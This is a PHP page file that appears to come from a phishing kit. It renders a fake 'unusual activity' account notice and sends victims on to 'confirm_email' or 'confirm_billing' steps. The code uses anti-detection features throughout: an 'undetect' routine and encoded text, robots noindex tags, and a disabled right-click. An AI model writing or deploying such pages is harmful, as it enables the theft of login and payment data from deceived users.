<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "unusual";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

if ($api->config("email") == "on") {
  $link = "../restore/confirm_email";
} else {
  $link = "../restore/confirm_billing";
}

$html = '
<!DOCTYPE html>
<html>
<head>
<title>'.$api->text_encode($text['18']).'</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount.safe.css").'" type="text/css">
</head>
<body oncontextmenu="return false">
<div class="contentContainer">
<div class="safeComponent">
<header>
<div class="logo"></div>
</header>
<h2>'.$api->text_encode($text['19']).'</h2>
<p class="description">'.$api->text_encode($text['20']).'</p>
<a href="'.$link.'" class="button primary">'.$api->text_encode($text['21']).'</a>
</div>
<div class="loaderOverlay">
<div class="modal-animate show" id="animate">
<div class="rotate"></div>
<div class="processing">'.$api->text_encode($text['22']).'</div>
</div>
<div class="modal-overlay show" id="overlay"></div>
</div>
</div>
<footer class="footer">
<ul>
<li><a href="#">'.$api->text_encode($text['16']).'</a></li>
<li><a href="#">'.$api->text_encode($text['17']).'</a></li>
</ul>
<div>
</div>
</footer>
<script type="text/javascript">
window.onload = function() { setTimeout(function() { document.getElementById("animate").className = "modal-animate hide"; document.getElementById("overlay").className = "modal-overlay hide"; }, 3000)}
</script>
</body>
</html>';

$api->undetect($html);
?>
